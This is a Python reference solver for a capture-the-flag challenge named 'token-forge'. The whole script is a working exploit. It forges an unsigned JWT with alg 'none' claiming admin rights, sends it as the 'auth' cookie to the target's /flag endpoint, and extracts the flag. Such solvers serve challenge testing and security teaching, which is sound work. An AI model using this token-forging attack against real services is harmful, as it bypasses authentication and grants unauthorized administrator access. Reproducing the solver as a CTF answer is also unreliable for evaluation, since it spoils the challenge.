#!/usr/bin/env python3
"""
Reference solver for token-forge.

Forge an alg:"none" admin JWT (header {"alg":"none"} . payload {"admin":true} .
empty signature) and read GET /flag.

    python3 solve.py <ip> <port>
"""
import base64
import json
import re
import sys

import requests

FLAG_RE = re.compile(r"TCP1P\{[^}]*\}")


def b64u(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def forge_admin_token() -> str:
    head = b64u(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    body = b64u(json.dumps({"user": "admin", "admin": True}).encode())
    return f"{head}.{body}."  # trailing dot, empty signature


def exploit(base: str) -> str | None:
    requests.get(base + "/", timeout=10)  # observe the legit guest token
    r = requests.get(base + "/flag", cookies={"auth": forge_admin_token()}, timeout=10)
    m = FLAG_RE.search(r.text)
    return m.group(0) if m else None


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    flag = exploit(f"http://{host}:{port}")
    print("FLAG:", flag) if flag else print("no flag — is the target up?")


if __name__ == "__main__":
    main()
